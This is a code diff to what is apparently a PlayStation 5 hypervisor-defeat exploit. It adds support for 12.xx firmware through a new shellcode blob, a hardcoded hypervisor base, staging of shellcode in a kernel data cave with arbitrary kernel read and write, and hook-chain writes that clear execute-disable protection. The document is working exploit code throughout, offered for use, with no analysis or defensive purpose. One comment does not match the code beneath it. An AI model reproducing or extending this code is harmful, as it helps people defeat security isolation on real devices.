@@ -2,6 +2,7 @@
 #include "hv_defeat_13xx.h"
 #include "khook.h"
 #include "shellcode_1360.h"
+#include "shellcode_12xx_blob.h"
 #include "utils.h"
 #include <machine/segments.h>
 #include <machine/tss.h>
@@ -97,7 +98,8 @@ uint64_t kgadget(kgadget_t gadget) {
 }
 
 static int offsets_present(void) {
-  if (fw != 0x1300 && fw != 0x1320 && fw != 0x1340 && fw != 0x1342 && fw != 0x1360)
+  if (!PS5_FW_IS_12XX(fw) && fw != 0x1300 && fw != 0x1320 && fw != 0x1340 &&
+      fw != 0x1342 && fw != 0x1360)
     return 0;
 
   const uint64_t required[] = {
@@ -148,13 +150,17 @@ static int offsets_present(void) {
       env_offset.GAD_RET_TRAMP,
       env_offset.GAD_DBREG_RESUME,
       env_offset.NVS_SIGNATURE,
-      env_offset.HV_EFI_MAP_ROOT,
   };
 
   for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++) {
     if (!required[i])
       return 0;
   }
+
+  /* 12.xx has no EFI map-root field: the region base is the constant
+   * 0x62800000, exactly as the Wigglez all-12.xx build does. */
+  if (!PS5_FW_IS_12XX(fw) && !env_offset.HV_EFI_MAP_ROOT)
+    return 0;
 
   return 1;
 }
@@ -349,10 +355,25 @@ static int install_startup_hook(uint64_t hv_region, uint64_t hv_base) {
   uint64_t oracle;
   uint64_t heap_pointer_slot = hv_base + HV_HEAP_POINTER_OFFSET;
   uint64_t pcpus_pointer_slot = hv_base + HV_PCPUS_POINTER_OFFSET;
+  const uint8_t *ap_bin =
+      PS5_FW_IS_12XX(fw) ? shellcode_ap_12xx_bin : stock_shellcode_ap_1360;
+  size_t ap_len =
+      PS5_FW_IS_12XX(fw) ? shellcode_ap_12xx_bin_len : stock_shellcode_ap_1360_len;
   int result;
 
-  if (kernel_write(data_cave + 0x1000, stock_shellcode_ap_1360,
-                   stock_shellcode_ap_1360_len))
+  if (ap_len > 0x800)
+    return -1;
+
+  /* Wigglez zeroes the whole 16 KiB data cave before staging the AP. */
+  if (PS5_FW_IS_12XX(fw)) {
+    for (size_t off = 0; off < 0x4000; off += sizeof(uint64_t)) {
+      uint64_t value = 0;
+      if (kernel_read(data_cave + off, &value, sizeof(value)) || value)
+        return -1;
+    }
+  }
+
+  if (kernel_write(data_cave + 0x1000, ap_bin, ap_len))
     return -1;
 
   result = kh_init(&hook, kernel_read, kernel_write, ktext, data_cave, 6);
@@ -379,6 +400,8 @@ static int install_startup_hook(uint64_t hv_region, uint64_t hv_base) {
   kh_chain_store(&chain, carrier + 0xF20, heap_pointer_slot);
   kh_chain_store(&chain, carrier + 0xF28, pcpus_pointer_slot);
   kh_chain_store(&chain, carrier + 0xF30, 1);
+  if (PS5_FW_IS_12XX(fw))
+    kh_chain_store(&chain, carrier + 0xFF0, 0x2029000);
 
   if (chain.err || clear_execute_disable(carrier))
     return -1;
@@ -400,8 +423,9 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
   uint64_t waking_vector;
   int result;
 
-  if ((fw != 0x1300 && fw != 0x1320 && fw != 0x1340 && fw != 0x1342 && fw != 0x1360) || !shellcode_kernel ||
-      !shellcode_kernel_len || !offsets_present()) {
+  if ((!PS5_FW_IS_12XX(fw) && fw != 0x1300 && fw != 0x1320 && fw != 0x1340 &&
+       fw != 0x1342 && fw != 0x1360) ||
+      !shellcode_kernel || !shellcode_kernel_len || !offsets_present()) {
     if (fw == 0x1360)
       notify("13.60 offsets incomplete\n");
     return -1;
@@ -413,7 +437,7 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
     return -1;
   }
 
-  hv_region = derive_h();
+  hv_region = PS5_FW_IS_12XX(fw) ? HV_BASE_REGULAR : derive_h();
   if (!hv_region) {
     if (fw == 0x1360)
       notify("13.60 hypervisor base was not found\n");
